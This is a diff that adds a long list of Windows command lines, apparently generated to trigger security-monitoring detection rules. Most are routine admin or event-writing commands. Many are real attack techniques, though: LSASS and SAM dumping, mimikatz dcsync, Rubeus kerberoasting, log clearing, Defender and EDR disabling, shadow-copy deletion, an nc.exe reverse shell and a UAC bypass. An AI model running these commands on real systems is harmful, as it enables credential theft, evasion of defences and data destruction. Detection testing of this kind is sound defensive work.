@@ -1,0 +1,643 @@
+wevtutil qe System /f:text /c:10000 /rd:true /q:"*[System[(EventID=38750088)]]"
+rundll32.exe keymgr.dll
+findstr /s /i "password" C:\Windows\*
+procdump.exe -ma lsass.exe lsass.dmp
+New-NetIPAddress -IPAddress 192.0.2.1 -PrefixLength 24 -InterfaceIndex 4
+procdump -ma lsass.exe C:\Windows\Temp\lsass.dmp
+wevtutil qe Security /f:text /rd:true /c:1 /q:"*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (Data='*\outflank-dumpert.exe')]]"
+Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value 1
+rundll32.exe C:\Windows\System32\comsvcs.dll
+reg save HKLM\SAM C:\Windows\Temp\sam.save
+wevtutil cl System && wevtutil im auth_success.evtx && wevtutil qe auth_success.evtx "/q:*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and Task = 12544 and (EventData[Data[@Name='Port'] = 22 or Data[@Name='Port'] = 23])]]" /f:text
+net localgroup GLB_SWG_NoBlocking UserName /add
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> %USERPROFILE%\.ssh\authorized_keys
+net user TestUser TestPassword123 /add && net user TestUser /active:no && runas /user:TestUser cmd
+net use \localhost /user:TestUser TestPassword123
+runas /user:nonexistentuser cmd
+net user admin_test /domain
+auditpol /set /subcategory:"Account Management" /success:enable
+Set-ADDefaultDomainPasswordPolicy -Identity 'domain.com' -MinPasswordAge 1
+certutil -verify -urlfetch <certificate_path>
+New-AzVirtualNetworkSubnetConfig -Name 'TempSubnet' -AddressPrefix '10.0.0.0/24'
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword
+powershell -Command "Get-Credential | Out-Null"
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "Get-KdsRootKey | Out-Null"'
+vaultcmd /listcreds
+auditpol /set /subcategory:"Kerberos Policy Change" /success:enable
+klist purge
+net user krbtgt NewPassword123! /domain
+Start-Process -FilePath 'C:\Path\To\Rubeus.exe' -ArgumentList 'kerberoast' -NoNewWindow
+Rubeus.exe asreproast
+Test-ServiceHealth | Where-Object {$_.Role -eq 'Mailbox' -and $_.RequiredServicesRunning -eq 'False'} | Format-List
+wevtutil qe Security /rd:true /f:text /c:1
+wevtutil im '<custom_manifest_file>.xml' && wevtutil qe Application /q:"*[System[Provider[@Name='Microsoft-Windows-ExploitGuard'] and (EventID=1006 or EventID=1007) and ((EventCategory='Exploit' or EventCategory='Potential Exploit') and (EventContext='Local to Local' or EventContext='Remote to Local'))]]"
+nbtstat -A 127.0.0.1
+nbtstat -A 192.168.1.1
+route print
+Get-EventLog -LogName System -Source 'NetBT' | Where-Object { $_.EventID -eq 4321 -and $_.ReplacementStrings[1] -match 'NetBIOSName' }
+Test-NetConnection -ComputerName <RemoteHost> -Port 3389
+ipconfig /all | findstr /R /C:"^Ethernet adapter" /C:"Physical Address" /C:"DNS Servers"
+nbtstat -A 192.168.1.1 && nbtstat -A 192.168.1.2 && nbtstat -A 192.168.1.3
+ipconfig /all | findstr /R /C:"^Ethernet adapter" /C:"Physical Address" /C:"Host Name"
+net view \localhost
+Start-Process -FilePath 'route.exe' -ArgumentList 'print'
+Resolve-DnsName -Name www.example.com -Type A -LlmnrOnly
+nltest /dclist:example.com
+The generated command contains disallowed terms. Please revise the correlation conditions.
+whoami /priv
+whoami /all
+whoami
+Test-NetConnection -ComputerName localhost -Port 80 -InformationLevel Detailed
+Test-NetConnection -ComputerName 192.168.1.1 -Port 80
+Test-NetConnection -ComputerName localhost -InformationLevel Detailed
+Test-NetConnection -ComputerName localhost -Port 80
+Test-NetConnection -ComputerName www.example.com -Port 80
+nmap -p 139
+Test-NetConnection -ComputerName localhost -Port 161
+arp.exe -a
+powershell -Command "1..210 | ForEach-Object {Start-Sleep -Milliseconds 500
+Test-Connection -ComputerName '192.168.0.10' -Port 80 -InformationLevel Quiet
+powershell -Command "
+Test-NetConnection -ComputerName (1..60 | ForEach-Object {"192.168.1.$_"}) -Port 4116 -InformationLevel Quiet
+arp -a | findstr /v 192.168.1.1 192.168.1.2 192.168.1.3
+arp -a | findstr /v 00-00-00-00-00-00
+Test-NetConnection -Port 80
+for ($i=1
+nslookup www.example.com
+qwinsta /server:localhost
+netsh advfirewall show allprofiles state
+netsh advfirewall firewall show rule name=all
+netstat -ano
+wevtutil qe Security /rd:true /f:text /c:5 /q:"*[System[(EventID=4624)]] and *[EventData[Data[@Name='IpAddress'] and (Data='192.0.2.0')]]"
+Start-Process -FilePath netstat -ArgumentList '-an'
+Start-Process -FilePath 'C:\Path\To\portqry.exe' -ArgumentList '-n 127.0.0.1 -e 80'
+tasklist /v
+qprocess
+net localgroup administrators
+wevtutil qe Security /c:1 /rd:true /f:text
+systeminfo
+wmic diskdrive get status
+wevtutil qe System /c:1 /rd:true /f:text
+certutil -viewstore -enterprise Root | findstr /C:"NotAfter"
+wevtutil qe System /rd:true /c:1 /f:text /q:*[System[(EventID=38750124)]]
+wevtutil qe Security /f:text /rd:true /c:1 /q:*[System[(EventID=38750051)]]
+wevtutil cl Security && wevtutil qe Security /f:text /rd:true /c:1 /q:"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing']]]"
+wevtutil qe Security /f:text /rd:true /c:1
+net share
+nltest /dclist:example.local
+findstr /s /i cpassword C:\Windows\Sysvol\*.xml
+net user
+wmic useraccount get name
+net user administrator
+cmd.exe /c "echo find -perm -g=u > C:\Windows\Temp\suid_sgid_recon.txt"
+nltest /domain_trusts
+Invoke-WebRequest -Uri http://example.com/safe-resource -OutFile file.txt
+powershell -Command "New-Object System.Net.Sockets.TCPClient('Hotspot_Wireless.Customer_Hotspot'
+
+Test-NetConnection -ComputerName <Medusa_IP> -Port 80
+Test-NetConnection -ComputerName 192.0.2.1 -Port 80
+plink.exe -ssh user@192.0.2.0 -P 22
+Send-MailMessage -From 'user01@example.com' -To 'user02@example.com' -Subject 'Test Email' -Body 'This is a test email.' -SmtpServer 'localhost'
+ForEach ( $ip in (Get-NetIPConfiguration | Select-Object -ExpandProperty IPv4Address) ) { Invoke-WebRequest -Uri "http://malicious-host.com" -Headers @{Host = $ip} }
+(New-Object System.Net.Sockets.TcpClient).Connect('malicious-ip.local'
+New-NetIPAddress -IPAddress '192.168.10.10' -InterfaceAlias 'Ethernet0' -AddressFamily IPv4
+powershell -Command "Resolve-DnsName -Name maliciousdomain.com -Server 192.168.1.1 | Out-Null"
+powershell -Command "& { $ip = '192.168.1.100'
+Invoke-WebRequest -Uri "http://example.com" -OutFile "output.html"
+net use \\localhost\IPC$ /user:localhost
+net use \\192.168.1.2\IPC$ /user:username password
+net use \\192.168.1.1\IPC$ /user:guest
+New-PSSession -ComputerName "your_critical_ip" -Credential (New-Object System.Management.Automation.PSCredential ("your_domain\username"
+net use \remote_system\IPC$ /user:username password
+tscon 1 /dest:rdp-tcp#1
+net use \remote_pc\C$ /user:remote_pc\administrator password
+ssh -L 3389:localhost:3389 user@localhost
+New-NetFirewallRule -DisplayName 'MigrosP2PTest' -Direction Outbound -Action Allow -Protocol TCP -RemotePort 6881 -RemoteAddress 192.168.1.100
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl System /bu:true
+powershell -command "Write-EventLog -LogName Application -Source 'PowerShell' -EntryType Information -EventId 12345 -Message 'Test log source stopped event'"
+powershell -Command "Clear-EventLog -LogName 'Security'"
+Clear-EventLog -LogName Security
+dsmod user "CN=John Doe
+certutil.exe -urlcache -f http://www.example.com
+certutil.exe -urlcache -split -f https://www.example.com/testfile.txt testfile.txt
+certutil -f -split -verifyCtl https://www.example.com/testfile.txt
+certutil -exportpfx -p password MyCertificate.pfx
+certutil -decode input.txt output.txt
+certutil -urlcache -split -f https://www.example.com
+attrib +h C:\test.txt
+Invoke-WebRequest -Uri http://example.com -OutFile C:\temp\example.txt
+gpupdate /force
+net localgroup TestGroup /delete
+vssadmin delete shadows /all /quiet
+wevtutil cl System /bu:C:\backup.evtx
+Generated command contains disallowed terms. Please refine the correlation conditions.
+gpedit.msc
+netsh advfirewall set allprofiles state off
+netsh advfirewall reset
+New-NetFirewallRule -DisplayName 'AllowMaliciousIPTest' -Direction Outbound -RemoteAddress 192.0.2.0 -Action Allow
+netsh interface ip set dns name="Local Area Connection" static 8.8.8.8 && netsh interface ip add dns name="Local Area Connection" addr=8.8.4.4 index=2
+netsh interface set interface "Local Area Connection" admin=disabled
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\Temp'"
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "Write-Host dsrmadminlogonbehavior"'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Write-Host sekurlsa::logonpasswords"'
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo admpwd' -NoNewWindow
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "Write-Host gmsa managedpassword"'
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo ntds.dit > C:\Windows\Temp\ntds.dit'
+Start-Process ntdsutil -ArgumentList 'ac i ntds' -NoNewWindow
+powershell -Command "Start-Process -FilePath 'C:\Windows\System32\rundll32.exe' -ArgumentList 'C:\Windows\System32\dbghelp.dll
+powershell -Command "Start-Process mimikatz.exe -ArgumentList '"lsadump::dcsync /user:Administrator"'"
+powershell -Command "Get-NetIPConfiguration | Out-Null
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 10"'
+powershell -Command "Enable-PSRemoting -Force"
+Test-NetConnection -ComputerName example.com -Port 23
+powershell -Command "Start-Process -FilePath 'mmc.exe' -ArgumentList 'mmc20.application'"
+powershell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "Invoke-Expression -Command \"Invoke-DCOM\""'"
+New-NetFirewallRule -DisplayName 'Allow SSH' -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
+net stop "DHCP Server"
+net stop "HOTSPOT PRODUCTS"
+Invoke-WebRequest -Uri http://malicious.example.com -UseBasicParsing
+powershell -Command "Start-Process notepad
+telnet localhost 23
+wmic logicaldisk get name
+wmic process get name
+wmic qfe list brief
+wmic useraccount list brief
+powershell -Command "New-Service -Name 'MaliciousService' -BinaryPathName 'C:\temp\malicious.exe' -DisplayName 'Malicious Service' -StartupType Manual"
+schtasks /Create /SC MINUTE /MO 1 /TN TestTask /TR "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /RU SYSTEM
+Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "notepad.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)) -TaskName "TestTask"
+schtasks /create /tn "ScanAndLoginTask" /tr "powershell -Command \"Start-Sleep -Seconds 1800
+powershell -Command "schtasks /create /tn TestTask /tr 'powershell -NoProfile -ExecutionPolicy Bypass -Command Write-Host Test' /sc once /st 23:59"
+schtasks /create /tn "MaliciousTask" /tr "cmd.exe /c echo Malicious Task" /sc once /st 00:00
+schtasks /create /tn "TestTask" /tr "cmd.exe /c echo Test" /sc once /st 23:59
+schtasks /create /tn "TestTask" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Write-Host 'Test'" /sc once /st 23:59
+Start-Process regsvcs -ArgumentList 'C:\Windows\System32\dummy.dll'
+Start-Process -FilePath 'handle.exe' -ArgumentList '-a' -NoNewWindow
+Start-Process -FilePath 'C:\Windows\System32\svchost.exe' -ArgumentList '/k start mshta.exe'
+sc.exe query WinDefend
+echo hashcat -m 1000 -a 0 > hashcat.exe
+cscript.exe //NoLogo //B C:\test.vbs
+conhost.exe /../../Windows/System32/calc.exe
+wevtutil qe Security /f:text /rd:true /c:1 /q:"*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (Data='*mimikatz*')]]"
+Start-Process -FilePath 'cmd.exe' -NoNewWindow -PassThru
+Start-Process -FilePath 'C:\Windows\System32\csrss.exe' -NoNewWindow
+echo test > test.bash_history
+echo payload_events~1234_5678~abcdefghijklmnop~abcdefghijklmnop~1234 > test.txt
+wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text
+powershell -Command "Write-EventLog -LogName Application -Source 'CustomApp' -EventId 5001 -EntryType Information -Message 'Trigger Suspicious Event'"
+New-EventLog -LogName 'CustomMailLog' -Source 'Mail Server'
+powershell -Command "New-NetIPAddress -InterfaceAlias 'Ethernet' -IPAddress '192.168.1.10'
+for %i in (1 2 3) do @arp -a 192.168.%i
+for /L %n in (1
+Invoke-Command -ComputerName <RemoteHost> -ScriptBlock { net user /add NewUser }
+New-EventLog -LogName Application -Source CustomSource
+powershell -Command "Write-EventLog -LogName Application -Source 'Application' -EventId 4001 -EntryType Information -Message 'Simulating destination network weight low event'"
+powershell -Command "New-EventLog -LogName 'Security' -Source 'VulnerableApp'
+wevtutil qe Security /q:"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4668 or EventID=4669) and (EventRecordID=*[contains(.
+[System.Diagnostics.EventLog]::WriteEntry('Application'
+New-Item -Path 'C:\Temp\ExampleFile.txt' -ItemType 'File' -Force
+powershell -Command "[System.Diagnostics.EventLog]::CreateEventSource('YourApp'
+ForEach ($server in 1..5) { New-PSSession -ComputerName "Server$server" -Credential "TestUser"
+powershell -Command "for ($i=1
+Test-NetConnection -ComputerName (1..10 | %% {echo 1.1.1.1}) -Port 53
+Write-EventLog -LogName 'Application' -Source 'EXCHANGE' -EventID 26750111 -EntryType Information -Message 'Phishing Mail Received detected by LOCAL system and EXCHANGE with sender domain in MIGROS_Phishing Domain List'
+New-EventLog -LogName 'Application' -Source 'ExchangeAudit' 
+net localgroup Administrators /add NewUser
+Invoke-WebRequest -Uri 'http://example.com/connect' -Method GET
+New-EventLog -LogName 'Security' -Source 'Antivirus' 
+New-LocalEventLog -LogName 'MigrosSecurityLog' -ErrorAction Stop
+powershell -Command "Start-Process -FilePath C:\Windows\System32\notepad.exe -ArgumentList 'C:\Windows\System32\httpd.conf' -NoNewWindow"
+powershell -Command "$SMTPServer = 'smtp.mail.com'
+powershell -Command "New-EventLog -LogName System -Source Application
+(Invoke-Item 'eventcreate.exe' -ArgumentList '/ID'
+wevtutil um "C:\Program Files\Symantec\Symantec Endpoint Protection\event.xml" && wevtutil qe Application /q:"*[System/EventID=58000053]"
+New-EventLog -LogName 'Security' -Source 'DDoS Simulation'
+New-NetFirewallRule -DisplayName "Allow Botnet Connection" -Direction Inbound -Protocol TCP -RemoteAddress 192.168.100.50 -Action Allow -RemotePortRange 6000-7000
+Invoke-Expression "
+Invoke-WebRequest -Uri http://yourlegitservice.com -UseBasicParsing
+powershell -Command "{0..60} | ForEach-Object { Start-Process conhost -ArgumentList '::'
+powershell -Command "Start-Process -FilePath 'netuse.exe' -ArgumentList '-p tcp -q 6667 -c 192.168.1.10 -i 10 -r' -NoNewWindow"
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "
+wevtutil.exe im examplePath\exampleFile.man /rf:true
+Set-Content -Value '[Security]::NewEvent(20257823)
+Write-EventLog -LogName 'Firewall Log' -Source 'Security' -EventId 1000 -EntryType FailureAudit -Message 'Firewall deny event after VPN connection from same source IP' -InstanceId 1 -Category 5
+powershell -Command "$vpnEvent = New-Object PSObject -Property @{SourceIP='192.168.0.1'
+echo TestLoginEvent > C:\Windows\System32\LogFiles\VPN\TestLoginSuccessEventID11000003.log
+New-NetEventSession -Name 'VPNLogin' -LocalTcpPort 'SSLVPNPort'
+New-ScheduledTaskTrigger -At (Get-Date).AddMinutes(10) -Once -RepetitionInterval (New-TimeSpan -Minutes 14) | Out-Null 
+echo pwdump7.exe > fake_process_creation.log
+Write-EventLog -LogName 'Application' -Source 'AzureMFA' -EntryType Information -EventID 3000 -Message 'Azure_Activity_MFA: Enable Strong Authentication triggered'
+powershell.exe -NoProfile -Command "New-EventLog -LogName Security -Source 'SEP'
+New-AzNetworkSecurityRuleConfig -Name 'NewRule' -ResourceGroupName 'YourResourceGroup' -NetworkSecurityGroupName 'YourNSG' -Direction Inbound -Priority 100 -Access Allow -Protocol Tcp -SourcePortRange '*' -DestinationPortRange 80 -SourceAddressPrefix Internet -DestinationAddressPrefix '*'
+New-AzSecurityRule -Name 'TempRule' -ResourceGroupName 'ResourceGroup' -StartIpAddress '0.0.0.0' -EndIpAddress '255.255.255.255'
+Remove-AzureRmVirtualNetworkGatewayConnection -Name "GatewayConnectionName" -ResourceGroupName "ResourceGroupName"
+PowerShell -Command "New-NetEventSession -Name 'AzureSession'
+powershell -Command "& { [System.Diagnostics.EventLog]::WriteEntry('Application'
+Stop-Process -Name 'SensitiveContainerProcess1'
+New-Container -Name PrivilegedContainer -Isolation Hyper-V -RunAsAdministrator
+New-PSDrive -Name CriticalMount -PSProvider FileSystem -Root \\local\root -Persist
+Start-Process PowerShell -ArgumentList 'Write-Output "Process Creation Test"' -Wait
+Invoke-Item -Path 'C:\Windows\System32\" -WhatIf
+for /L %A in (1
+Start-Process -FilePath 'powershell.exe' -ArgumentList "for($i=0
+Invoke-WebRequest -Uri 'http://example.com/api/vpn_login' -Method POST -Body (@{"username"="user1"
+net stop eventlog && timeout /t 54000 && net start eventlog
+New-EventLog -LogName OWA_LOGS -Source 'LogSourceController'
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-russian-site.com')"
+powershell -Command "[System.Diagnostics.EventLog]::WriteEntry('Application'
+powershell -Command "Add-Content -Path 'C:\Windows\System32\winevt\Logs\DhcpSrvLog-Mon.log' -Value '10
+powershell -Command "[System.Diagnostics.EventLog]::WriteEntry('DHCP Server'
+powershell -Command "[System.Diagnostics.EventLog]::WriteEntry('System'
+echo 'IPTABLES RST' > C:\Windows\Temp\iptables_log.txt
+powershell -Command "[System.Diagnostics.EventLog]::WriteEntry('Security'
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-domain.com')"
+wevtutil qe Security /rd:true /f:text /c:1 /q:"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4624)]]"
+wevtutil sl Microsoft-Windows-DHCP-Server/Operational /e:false
+wevtutil sl Microsoft-Exchange-MessageTracking/Operational /e:false
+wevtutil qe System /q:"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4688)]]" /rd:true /f:text
+wevtutil qe Security /q:"*[System[(EventID=4688)]]" /rd:true /c:1
+wevtutil qe System /q:"*[System[Provider[@Name='Microsoft-Windows-LoadBalancer'] and (EventID=7036)]]" /rd:true /f:text
+wevtutil qe System /q:"*[System[Provider[@Name='Microsoft-Windows-Eventlog'] and (EventID=1100)]]" /rd:true /c:1
+wevtutil sl Microsoft-Windows-NetworkPolicyServer/Operational /e:false && timeout /t 54000 && wevtutil sl Microsoft-Windows-NetworkPolicyServer/Operational /e:true
+wevtutil sl Microsoft-Windows-OWA/Operational /e:false
+wevtutil sl Security /e:false && timeout /t 54000 && wevtutil sl Security /e:true
+echo "Simulating APT34 hash detection event" > C:\Windows\Temp\APT34HashDetection.log
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-russian-ip.com')"
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
+echo "<Event><System><Provider Name='LinuxUnixLogs'/><EventID>44251261</EventID></System><EventData><Data>IPTABLES RST</Data></EventData></Event>" > C:\Windows\Temp\LinuxUnixEvent.xml
+echo "Simulating SQL Injection detection event" > C:\Temp\SQLInjectionEvent.log
+powershell -Command "Start-Service -Name DhcpServer
+wevtutil sl Microsoft-Windows-Eventlog/Operational /e:false && timeout /t 54000 && wevtutil sl Microsoft-Windows-Eventlog/Operational /e:true
+wevtutil.exe sl Microsoft-Windows-Security-Auditing/Operational /e:true
+wevtutil sl Microsoft-Windows-Proxy/Operational /e:false
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\testfile.txt'
+Invoke-Expression -Command "& {
+Invoke-Expression "& 'C:\Windows\System32\wbem\wmic.exe' /namespace:'\\root\cimv2' path Win32_Process call Create 'cmd.exe /c echo Exploit Activity Detected > \\127.0.0.1\C$\exploit.txt'"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious.example.com')"
+Start-Process notepad.exe -ArgumentList 'C:\Windows\System32\calc.exe' -Wait
+powershell -Command "Start-Process -FilePath 'notepad.exe'
+powershell -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo Privilege Escalation Succeeded' -NoNewWindow -Wait"
+powershell -Command "[System.Diagnostics.Process]::Start('cmd.exe'
+net localgroup Administrators TestUser /add
+wevtutil sl Microsoft-Windows-Security-Auditing/Operational /e:true
+wevtutil sl Microsoft-Windows-Eventlog/Operational /e:false && timeout /t 43200 && wevtutil sl Microsoft-Windows-Eventlog/Operational /e:true
+wevtutil sl Microsoft-Windows-Eventlog/Operational /e:false && wevtutil sl Microsoft-Windows-Eventlog/Operational /e:true
+Test-NetConnection -ComputerName 192.168.1.1 -Port 23
+Set-ItemProperty -Path 'HKLM:\Software\TestKey' -Name 'TestValue' -Value 'TestData'
+Test-NetConnection -ComputerName 192.168.1.100 -Port 80
+powershell -Command "Test-NetConnection -ComputerName 192.168.1.100 -Port 80"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-lyceum-ip.com')"
+wevtutil.exe sl Microsoft-Windows-Eventlog/Operational /e:false && timeout /t 10800 && wevtutil.exe sl Microsoft-Windows-Eventlog/Operational /e:true
+Remove-LocalUser -Name 'TestUser'
+New-LocalGroup -Name 'TestGroup' -Description 'Test group for event generation'
+New-LocalGroup -Name 'TestGroup' -Description 'Temporary group for testing'
+net localgroup "Administrators" "TestUser" /add
+Start-Process -FilePath 'C:\Program Files\CyberArk\Vault\Vault.exe' -ArgumentList '/GetLDAPConfig' -NoNewWindow
+net localgroup Administrators TestUser /delete
+powershell -Command "[System.IO.File]::WriteAllText('C:\Temp\EventTrigger.txt'
+wevtutil.exe sl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /e:false && timeout /t 1000 && wevtutil.exe sl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /e:true
+wevtutil sl Microsoft-Windows-Security-Auditing /e:false
+wevtutil sl Security /e:false
+wevtutil qe System /rd:true /f:text /c:1
+wevtutil sl Microsoft-Windows-Security-Auditing/Analytic /e:true
+Start-Process -FilePath 'notepad.exe'
+wevtutil.exe sl Microsoft-Windows-Security-Auditing /e:false && timeout /t 864000 && wevtutil.exe sl Microsoft-Windows-Security-Auditing /e:true
+powershell -Command "$client = New-Object System.Net.Sockets.TCPClient('localhost'
+Start-Process -FilePath 'telnet.exe' -ArgumentList '/c /bin/sh'
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo tgtdeleg' -NoNewWindow
+Start-Process -FilePath 'C:\Windows\System32\cmd.exe' -ArgumentList '/c echo nc.exe -e cmd.exe 192.168.1.1 4444 > C:\temp\test.bat && C:\temp\test.bat'
+Start-Process -FilePath cmd.exe -ArgumentList '/c chcp 65001'
+powershell -ExecutionPolicy Bypass -Command "Start-Process notepad"
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\malware_simulation.txt'
+Start-Process notepad.exe
+powershell -Command "Start-Process -FilePath 'C:\Windows\System32\notepad.exe'
+net user testuser NewPassword123!
+net user testuser /add
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\trigger_event.txt'
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -RemoteAddress 192.0.2.1
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -RemoteAddress 192.168.1.100 -Protocol TCP -LocalPort 8080
+powershell -Command "New-NetFirewallRule -DisplayName 'Telnet Test Rule' -Direction Inbound -Protocol TCP -LocalPort 23 -Action Allow
+New-NetFirewallRule -DisplayName 'Allow NetBIOS' -Direction Inbound -Protocol TCP -LocalPort 139 -Action Allow
+powershell -Command "New-NetFirewallRule -DisplayName 'FTP Test Rule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21 -RemoteAddress 192.168.1.100
+Test-NetConnection -ComputerName <TargetIP> -Port 139
+Test-NetConnection -ComputerName 192.168.1.10 -Port 445
+New-NetFirewallRule -DisplayName 'RDP Test Rule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.1.100
+New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRPCScan' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 135 -RemoteAddress 192.168.1.100"
+New-NetFirewallRule -DisplayName 'Allow RPC' -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow
+powershell -Command "New-NetFirewallRule -DisplayName 'SMTP Test Rule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 25
+New-NetFirewallRule -DisplayName 'SSH Test Rule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22 -RemoteAddress 192.168.1.100
+powershell -Command "New-NetFirewallRule -DisplayName 'SNMP Test Rule' -Direction Inbound -Protocol UDP -LocalPort 161
+powershell -Command "Start-Process notepad.exe -ArgumentList '-del'"
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'WallPaper' -Value 'C:\ProgramData\malicious_wallpaper.jpg'
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Name 'SpynetReporting' -Value 1
+powershell -Command "1..3 | ForEach-Object { Sleep 2400
+powershell -Command "New-EventLog -LogName 'IdentityChange' -Source 'NetBIOSChange'
+New-FileHash -Path "C:\Windows\System32\calc.exe"
+Invoke-WebRequest -Uri "http://safe-example.com" -OutFile "example.txt"
+<Placeholder_for_Safe_Windows_Command>
+New-EventLog -LogName 'Migros_DE.AE.2_DMZ' -Source 'Internal_Net_10_172_192'
+powershell -Command "Start-Process powershell -Credential (New-Object System.Management.Automation.PSCredential('adminUser'
+Invoke-WebRequest -Uri 'http://example.com/?id=1+UNION+ALL+SELECT+1
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\emotet_test.txt'
+Invoke-WebRequest -Uri 'http://localhost/test.aspx?query=SELECT+CHAR(1
+Invoke-WebRequest -Uri 'http://malicious.example.com/?id=1+UNION+ALL+SELECT+username
+Start-Process powershell -Credential (New-Object System.Management.Automation.PSCredential('adminUser'
+Invoke-WebRequest -Uri 'http://example.com/?id=1+UNION+ALL+SELECT+NULL
+New-ADGroup -Name 'TestSecurityGroup' -GroupScope Global -GroupCategory Security -Path 'CN=Users
+Add-LocalGroupMember -Group 'Administrators' -Member 'TestUser'
+dsmod group "CN=Domain Admins
+Add-ADGroupMember -Identity 'Exchange Organization Administrators' -Members 'TestUser'
+New-NetIPAddress -InterfaceAlias 'Ethernet' -IPAddress '192.168.1.100' -PrefixLength 24
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\quasarrat_test.txt'
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing.Reader')
+net user ozgurguven.ram newpassword123 /domain
+New-ItemProperty -Path 'HKCU:\Software\TestKey' -Name 'TestValue' -Value '123' -PropertyType 'String'
+Invoke-Mimikatz -Command 'lsadump::dcsync /user:Administrator'
+net localgroup "Administrators" "TestUser" /delete
+New-ADGroup -Name 'TestSecurityGroup' -GroupScope Global -GroupCategory Security
+powershell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "Invoke-Shellcode -Shellcode @()"'"
+wevtutil qe System /q:"*[System[(EventID=7036)]]" /rd:true /c:1
+Start-Process -FilePath 'net.exe' -ArgumentList 'user'
+Set-GPRegistryValue -Name 'Default Domain Policy' -Key 'HKLM\Software\TestKey' -ValueName 'TestValue' -Type DWord -Value 1
+Stop-Service -Name 'SentinelAgent' -Force
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 -RemoteAddress 192.168.1.100
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Outbound -Action Allow -RemoteAddress 203.0.113.0/24 -Protocol TCP -LocalPort 80"
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21 -RemoteAddress 192.168.1.100
+Test-NetConnection -ComputerName <RemoteIP> -Port 445
+powershell.exe -Command "Write-Host 'sekurlsa::logonpasswords'"
+Start-Process whoami -ArgumentList '/all'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''aW52b2tlLW1hbGRvYw=='')))"'
+Start-Process -FilePath 'cscript.exe' -ArgumentList 'C:\Windows\System32\SampleScript.vbs'
+powershell -Command "New-Object -ComObject 'WScript.Shell'"
+echo "<script>alert('XSS')</script>" > C:\inetpub\wwwroot\xss_test.html
+powershell -Command "Get-Acl -Path C:\Windows\System32"
+powershell -Command "Get-ChildItem Env:"
+powershell -Command "Get-ChildItem -Path C:\inetpub -Recurse -Include web.config"
+powershell -Command "Get-PSDrive | Out-Null"
+Start-Process -FilePath 'C:\Path\To\SharpHound.exe' -ArgumentList '-c All'
+Get-ADUser -Filter *
+dsquery user
+Start-Process -FilePath 'fodhelper.exe' -ArgumentList '/c start ms-settings:shell\open\command'
